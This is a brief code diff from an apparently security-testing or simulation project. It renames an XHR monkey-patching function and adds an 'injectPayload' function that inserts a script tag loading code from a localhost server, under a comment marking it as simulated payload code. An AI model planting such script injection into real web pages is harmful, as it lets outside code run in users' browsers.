@@ -62,7 +62,7 @@ async function fetchGetAnswer()
 // ****************************************************************
 //  Payload simulated code below
 
-function monkeyPatch()
+function monkeyPatchPrototype()
 {
 
 	// XHR Part
@@ -182,4 +182,11 @@ function monkeyPatch()
 			throw error;
 		});
 	};
+}
+
+
+function injectPayload()
+{
+	document.body.appendChild(Object.assign(document.createElement('script'),{src:'https://localhost:8444/lib/telemlib.js',type:'text/javascript'}));
+
 }
